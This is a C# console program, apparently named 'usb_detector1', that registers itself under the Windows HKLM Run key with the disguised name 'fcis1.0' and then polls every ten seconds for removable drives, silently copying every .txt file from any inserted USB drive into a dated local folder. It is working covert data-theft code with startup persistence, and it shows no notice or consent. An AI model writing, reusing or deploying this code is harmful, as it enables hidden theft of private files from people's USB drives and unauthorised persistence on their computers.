using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using Microsoft.Win32;
//using System.Windows.Forms;

namespace usb_detector1
{
    class Program
    {

        public static void copyDirectory(string Src, string Dst)
        {
            String[] Files;
            String[] dirs;

            if (Dst[Dst.Length - 1] != Path.DirectorySeparatorChar) Dst += Path.DirectorySeparatorChar;
            if (!Directory.Exists(Dst)) Directory.CreateDirectory(Dst);

            Files = Directory.GetFileSystemEntries(Src, "*.txt");
            foreach (string Element in Files)
            {
                //SimpleDetector.Form1.showMessage(Element);
                // Sub directories
                if (Directory.Exists(Element)) copyDirectory(Element, Dst + Path.GetFileName(Element));
                // Files in directory
                else File.Copy(Element, Dst + Path.GetFileName(Element), true);
            }
            Files = null;

            dirs = Directory.GetDirectories(Src);
            foreach (string dir in dirs)
            {

                Files = Directory.GetFileSystemEntries(dir, "*.txt");
                foreach (string Element in Files)
                {
                    //SimpleDetector.Form1.showMessage(Element);
                    //Console.WriteLine("copy " + Element);
                    // Sub directories
                    if (Directory.Exists(Element)) copyDirectory(Element, Dst + Path.GetFileName(Element));
                    // Files in directory
                    else File.Copy(Element, Dst + Path.GetFileName(Element), true);
                }
            }
        }

        static void Main(string[] args)
        {
            /*System.Timers.Timer tm = new System.Timers.Timer(10000);
            
            tm.Interval = 10000;
            tm.Tick += new EventHandler(tm_Tick);
            
            tm.Start();*/
            //System.Threading.Thread.Sleep(10000);
           Registry.SetValue(@"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "fcis1.0", (object)System.Windows.Forms.Application.ExecutablePath);

            while (true)
            {

                DriveInfo[] allDrives = DriveInfo.GetDrives();
                foreach (DriveInfo d in allDrives)
                {
                    // skip diskette
                    if (d.Name.ToUpper() == "A:\\" || d.Name.ToUpper() == "B:\\")
                        continue;

                    if (d.DriveType == DriveType.Removable && d.IsReady)
                    {
                        //Console.WriteLine("Name:" + d.Name + "\nRoot directory: " + d.RootDirectory + "\nVolume Label" + d.VolumeLabel);
                        copyDirectory(d.Name, Directory.GetCurrentDirectory().ToString() + "\\" + d.VolumeLabel + "_" + DateTime.Now.Month + "_" + DateTime.Now.Day + "_" + DateTime.Now.Hour );

                        //this could be usb 
                    }

                }
                System.Threading.Thread.Sleep(10000);
            }
        }

        /*static void tm_Tick(object sender, EventArgs e)
        {
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                // skip diskette
                if (d.Name.ToUpper() == "A:\\" || d.Name.ToUpper() == "B:\\")
                    continue;

                if (d.DriveType == DriveType.Removable && d.IsReady)
                {
                    //Console.WriteLine("Name:" + d.Name + "\nRoot directory: " + d.RootDirectory + "\nVolume Label" + d.VolumeLabel);
                    copyDirectory(d.Name, Directory.GetCurrentDirectory().ToString() + "\\" + d.VolumeLabel + "_" + DateTime.Now.Month + "_" + DateTime.Now.Day + "_" + DateTime.Now.Hour + "_" + DateTime.Now.Minute);

                    //this could be usb 
                }

            }
            allDrives = null;
            
            throw new Exception("The method or operation is not implemented.");
        } */   
    }

}
